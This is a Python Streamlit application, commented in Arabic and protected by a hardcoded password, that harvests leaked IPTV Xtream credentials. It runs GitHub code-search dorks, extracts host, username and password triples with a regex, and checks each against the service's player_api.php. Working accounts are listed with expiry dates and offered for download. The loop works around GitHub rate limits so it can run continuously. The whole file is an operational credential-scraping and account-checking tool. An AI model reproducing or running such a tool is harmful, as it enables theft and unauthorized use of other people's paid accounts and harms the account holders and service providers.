import streamlit as st
import requests
import re
import time
from datetime import datetime

# =================================================
# 1. إعدادات الأمان والواجهة
# =================================================
LOGIN_PASSWORD = "BEAST_V17_PRO"

def check_password():
    if "password_correct" not in st.session_state:
        st.session_state.password_correct = False
    if st.session_state.password_correct: return True

    st.markdown("<h1 style='text-align: center; color:#00E676;'>🌪️ ULTRA BEAST V17 PRO</h1>", unsafe_allow_html=True)
    pwd = st.text_input("أدخل كلمة مرور النظام:", type="password")
    if st.button("فتح الرادار"):
        if pwd == LOGIN_PASSWORD:
            st.session_state.password_correct = True
            st.rerun()
        else: st.error("❌ كلمة المرور غير صحيحة")
    return False

if not check_password(): st.stop()

st.set_page_config(page_title="Ultra Beast V17 - Web", layout="wide")

# تنسيق واجهة الـ Terminal الخضراء مثل نسخة الكمبيوتر
st.markdown("""
<style>
    .stApp { background-color: #0c0e12; }
    .result-card {
        background: #14161a;
        border-left: 5px solid #00E676;
        padding: 15px;
        margin-bottom: 10px;
        border-radius: 5px;
        font-family: 'Consolas', monospace;
    }
    .status-active { color: #00FF41; font-weight: bold; }
</style>
""", unsafe_allow_html=True)

# إدارة الذاكرة (Session State)
if 'results' not in st.session_state: st.session_state.results = []
if 'is_hunting' not in st.session_state: st.session_state.is_hunting = False
if 'checked_count' not in st.session_state: st.session_state.checked_count = 0
if 'found_count' not in st.session_state: st.session_state.found_count = 0
if 'unique_cache' not in st.session_state: st.session_state.unique_cache = set()

# =================================================
# 2. محرك الصيد (المنقول من نسخة الكمبيوتر)
# =================================================

def check_xtream_worker(host, user, pw):
    u_id = f"{host}{user}"
    if u_id in st.session_state.unique_cache: return None
    st.session_state.unique_cache.add(u_id)

    try:
        api_url = f"{host}/player_api.php?username={user}&password={pw}"
        # زيادة التايم أوت قليلاً لضمان الاستجابة في الويب
        r = requests.get(api_url, timeout=5).json()
        if r.get("user_info", {}).get("status") == "Active":
            info = r["user_info"]
            exp_date = info.get('exp_date')
            exp = datetime.fromtimestamp(int(exp_date)).strftime('%Y-%m-%d') if exp_date and str(exp_date).isdigit() else "Unlimited"
            
            return {
                "host": host, "user": user, "pass": pw,
                "exp": exp, "conn": f"{info.get('active_cons', '0')}/{info.get('max_connections', '1')}"
            }
    except: return None
    return None

# =================================================
# 3. الواجهة الجانبية والتحكم
# =================================================
with st.sidebar:
    st.title("🌪️ BEAST CONTROL")
    token = st.text_input("GitHub Token:", type="password", help="ضع توكن جيت هاب هنا")
    
    col1, col2 = st.columns(2)
    with col1:
        if st.button("🚀 بدء الصيد"):
            if token:
                st.session_state.is_hunting = True
                st.rerun()
            else: st.error("أدخل التوكن!")
    with col2:
        if st.button("🛑 إيقاف"):
            st.session_state.is_hunting = False
            st.rerun()

    st.divider()
    st.metric("💎 شغال (ACTIVE)", st.session_state.found_count)
    st.metric("🔍 تم فحص", st.session_state.checked_count)
    
    if st.session_state.results:
        data_to_save = ""
        for r in st.session_state.results:
            data_to_save += f"HOST: {r['host']}\nUSER: {r['user']}\nPASS: {r['pass']}\nEXP: {r['exp']}\n{'-'*30}\n"
        st.download_button("📥 تحميل النتائج", data_to_save, "Beast_Results.txt")

# =================================================
# 4. منطقة العرض الرئيسية (الرادار)
# =================================================
st.subheader("📡 رادار الصيد المليوني المباشر")
log_area = st.empty()
results_container = st.container()

def update_display():
    with results_container:
        for r in st.session_state.results[:20]: # عرض آخر 20 نتيجة فقط للسرعة
            st.markdown(f"""
            <div class="result-card">
                <span class="status-active">✅ ACTIVE | Exp: {r['exp']} | Conn: {r['conn']}</span><br>
                <b>HOST:</b> {r['host']}<br>
                <b>USER:</b> {r['user']} | <b>PASS:</b> {r['pass']}
            </div>
            """, unsafe_allow_html=True)

# تشغيل المحرك
if st.session_state.is_hunting:
    headers = {'Authorization': f'token {token}', 'Accept': 'application/vnd.github.v3+json'}
    
    # نفس قائمة الدوركات الجبارة من نسخة V14
    massive_dorks = [
        'extension:txt "get.php?username="',
        'extension:m3u "player_api.php"',
        'filename:xtream.txt',
        'filename:iptv.txt',
        '"http://" "user" "pass" "port" extension:txt',
        'iptv+2026+xtream'
    ]

    while st.session_state.is_hunting:
        for dork in massive_dorks:
            if not st.session_state.is_hunting: break
            
            for page in range(1, 11): # 10 صفحات لكل دورت
                if not st.session_state.is_hunting: break
                
                log_area.info(f"🔎 الرادار يمسح حالياً: {dork} | صفحة: {page}")
                
                try:
                    search_url = f"https://api.github.com/search/code?q={dork}&page={page}&per_page=100"
                    res = requests.get(search_url, headers=headers).json()
                    
                    # معالجة حظر جيت هاب (السر في عدم التوقف)
                    if "message" in res and "rate limit" in res["message"].lower():
                        log_area.warning("⏳ جيت هاب متعب قليلاً.. سأرتاح 30 ثانية ثم أكمل الصيد فوراً.")
                        time.sleep(30)
                        continue

                    items = res.get('items', [])
                    if not items: break

                    for item in items:
                        if not st.session_state.is_hunting: break
                        raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                        
                        try:
                            content = requests.get(raw_url, timeout=3).text
                            # نمط الاستخراج (Regex) المنقول من V14
                            matches = re.findall(r"(http://[a-zA-Z0-9\.-]+:\d+)/[a-zA-Z\._-]+\?username=([a-zA-Z0-9\._-]+)&password=([a-zA-Z0-9\._-]+)", content)
                            
                            for m in matches:
                                st.session_state.checked_count += 1
                                result = check_xtream_worker(m[0], m[1], m[2])
                                
                                if result:
                                    st.session_state.results.insert(0, result)
                                    st.session_state.found_count += 1
                                    update_display() # تحديث الواجهة فوراً عند الصيد
                        except: continue
                    
                    time.sleep(2) # استراحة بسيطة
                except: continue
        
        log_area.success("🔄 اكتملت الدورة، جاري إعادة الصيد المليوني...")
        time.sleep(5)
else:
    update_display()
